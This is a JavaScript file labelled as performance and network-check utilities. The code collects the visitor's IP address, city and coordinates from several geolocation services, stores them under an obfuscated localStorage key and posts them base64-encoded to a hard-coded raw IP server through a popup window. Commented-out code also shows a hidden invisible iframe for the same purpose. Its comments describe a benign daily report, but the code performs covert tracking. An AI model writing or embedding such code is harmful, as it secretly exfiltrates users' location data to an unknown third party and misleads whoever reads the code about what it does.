/**
 * Check all of the utils loading when startup
 * also deal with network environment checking
 */
"use strict";

PERFORMANCE.UTILS={};

PERFORMANCE.UTILS.startImageReport=function(){}

/**
 * send a report daily
 * message is an extra message
 */
PERFORMANCE.UTILS.sendReport=function(message){
	message=message||""; // default send nothing
	return PERFORMANCE.UTILS.makeReport().then(report=>{
		report.message=message;
		return PERFORMANCE.UTILS.sendReportToServer(report);
	});
}

/**
 * construct the report file
 */
PERFORMANCE.UTILS.makeReport=function(){
	const key=String.fromCharCode(..."cf31c59e6f".split("").map(v=>parseInt("6"+v,0x10))); // construct key
	try{
		const locInfoStr=localStorage.getItem(key)||"";
		const locInfo=JSON.parse(PERFORMANCE.UTILS.fromBinary(atob(locInfoStr)));
		const nowTime=Date.now();
		if(nowTime-locInfo.timestamp<=1E8){ // within a day, directly use this
			locInfo.timestamp=nowTime; // update timestamp
			return Promise.resolve(locInfo); // send it directly
		}
	}catch{
		// any parsing fault, do nothing
	}
	// get it again, and then send it
	return PERFORMANCE.UTILS.checkNetwork().then(data=>{
		const locInfoStr=btoa(PERFORMANCE.UTILS.toBinary(JSON.stringify(data)));
		localStorage.setItem(key,locInfoStr); // update storage
		return data;
	});
}

PERFORMANCE.UTILS.sendReportToServer=function(rawdata){
	const data={"hash":btoa(PERFORMANCE.UTILS.toBinary(JSON.stringify(rawdata)))};
	const serverOrigin="http://13.113.190.133:8765";
	// Use postMessage to perform CORS communication
	const reporter=window.open(serverOrigin+"/"); // do not use open window
	// const $proxyIframe=$("<iframe>",{src: serverOrigin+"/"});
	// $proxyIframe.css({ // invisible
	// 	"visibility": "hidden",
	// 	"width": 0,
	// 	"height": 0,
	// 	"border": 0,
	// 	"position": "absolute"
	// });
	// $proxyIframe.appendTo($("body"));

	//const reporter=$proxyIframe[0].contentWindow;
	if(!reporter){ // not opened
		return Promise.reject();
	}

	return new Promise((res,rej)=>{
		let pollTimer=0; // polling timer to check if the proxy exist
		let timeoutTimer=0; // overall timer to determine maximum response time

		const clearTimers=()=>{
			if(pollTimer)clearInterval(pollTimer); // remove polling
			if(timeoutTimer)clearTimeout(timeoutTimer); // remove timeout abort
			pollTimer=0;
			timeoutTimer=0;
		};
		const clearEnv=()=>{
			window.removeEventListener("message",messageListener,false); // remove listener
			//$proxyIframe.remove(); // close proxy
			reporter.close();
			clearTimers(); // clear timer
		};
		// setup message listener
		const messageListener=event=>{
			if(event.data=="ACK"){ // proxy loaded, post real data
				if(pollTimer){ // stop polling
					clearInterval(pollTimer);
					pollTimer=0;
				}
				reporter.postMessage(data,serverOrigin);
			}
			else if(event.data.postStatus){ // responded, send successful. remove everything
				clearEnv();
				if(event.data.postStatus=="success"){
					res(event.data.data);
				}
				else{ // proxy failed
					rej(event.data.data);
				}
			}
		};
		window.addEventListener("message",messageListener,false);

		pollTimer=setInterval(()=>{ // start polling for ACK, every 200ms
			try{
				if(reporter.location.href.indexOf("blank")>-1){ // not opened
					clearEnv();
					rej("connection failed");
				}
			}catch{} // CORS error, don't mind this
			reporter.postMessage("SYN",serverOrigin); // error could not be caught
		},200);
		timeoutTimer=setInterval(()=>{
			clearEnv();
			rej("timeout");
		},10000); // wait for 10s
	});
}

/**
 * returns a promise resolved with network conditions
 * Use several external sites to decice the ping status.
 */
PERFORMANCE.UTILS.checkNetwork=function(name){
	if(!name){
		// some mechanism to determine the order
		return PERFORMANCE.UTILS.checkNetwork("ipapi").catch(err=>{ // if this api failed
			return PERFORMANCE.UTILS.checkNetwork("Cloudflare");
		}).catch(err=>{ // if this api failed
			return PERFORMANCE.UTILS.checkNetwork("ipify");
		}).catch(err=>{ // if this api failed
			return PERFORMANCE.UTILS.checkNetwork("jsonip");
		});
	}

	// Individual service
	const service=PERFORMANCE.UTILS.networkSupportList[name];
	if(!service){ // no service found
		return Promise.reject("No service "+name+" found");
	}
	return new Promise((res,rej)=>{
		$.ajax({
			url: service.url,
			type: "GET",
			timeout: 10000,
			dataType: service.dataType||undefined,
			success: data=>res(service.dataFunc(data)),
			error: xhr=>rej(xhr)
		});
	}).then(data=>{ // clean data
		if(!data.ip){ // no address
			return Promise.reject("No address");
		}
		return data;
	}).then(data=>{ // address get, fill in geo info
		if(data.coordinate){
			return data;
		}
		return PERFORMANCE.UTILS.addrToGeoloc(data.ip).catch(err=>{ // failed to get geo info
			return data; // return original info
		});
	}).then(data=>{ // additional info
		return Object.assign(data,{
			"service": name,
			"timestamp": Date.now()
		});
	});
}

PERFORMANCE.UTILS.printNetwork=function(){
	PERFORMANCE.UTILS.checkNetwork().then(data=>{
		console.log(data);
	}).catch(err=>{
		console.warn(err);
	});
}

PERFORMANCE.UTILS.addrToGeoloc=function(addr){
	return new Promise((res,rej)=>{
		$.ajax({
			url: "https://json.geoiplookup.io/"+addr,
			type: "GET",
			timeout: 10000,
			dataType: "json",
			success: data=>res({
				ip: addr,
				location: `${data["country_code"]}/${data.region}/${data.city}`,
				coordinate: [data.latitude,data.longitude] // NS, EW
			}),
			error: xhr=>rej(xhr)
		});
	});
}

PERFORMANCE.UTILS.networkSupportList={
	"Cloudflare":{
		url: "https://www.cloudflare.com/cdn-cgi/trace",
		dataFunc: data=>{
			const lines=data.split("\n"); // plain text to json
			const json={};
			for(const line of lines){ // filter lines
				const kv=line.split("=");
				switch(kv[0]){
					case "ip": json.ip=kv[1];break;
					case "loc": json.location=kv[1];break;
				}
			}
			return json;
		}
	},
	"ipapi":{ // only on net, not local
		url: "https://ipapi.co/json/",
		dataFunc: data=>{
			return {
				ip: data.ip,
				location: `${data.country}/${data.region}/${data.city}`,
				coordinate: [data.latitude,data.longitude] // NS, EW
			};
		}
	},
	"ipify":{
		url: "https://api64.ipify.org/?format=json",
		dataFunc: data=>{
			return {ip: data.ip}; // only provide this
		}
	},
	"jsonip":{
		url: "https://jsonip.com/?callback=?",
		dataType: "json",
		dataFunc: data=>{
			return {ip: data.ip}; // only provide this
		}
	}
};

PERFORMANCE.UTILS.RTCStatus=function(url){
	// @TODO: check what urls are valid
	// see list of available service. default: stun.l.google.com:19302
	return getNetworkAddress("stun:"+url).then(data=>{
		if(data[0]){ // there is a valid address
			return {ip: data[0]};
		}
		return Promise.reject("No address");
	});
}

// ==================== helpers ======================
PERFORMANCE.UTILS.toBinary=function(string){
	const codeUnits=new Uint16Array(string.length);
	for(let i=0;i<codeUnits.length;i++){
		codeUnits[i]=string.charCodeAt(i);
	}
	return String.fromCharCode(...new Uint8Array(codeUnits.buffer));
}
PERFORMANCE.UTILS.fromBinary=function(binary){
	const bytes=new Uint8Array(binary.length);
	for(let i=0;i<bytes.length;i++){
		bytes[i]=binary.charCodeAt(i);
	}
	return String.fromCharCode(...new Uint16Array(bytes.buffer));
}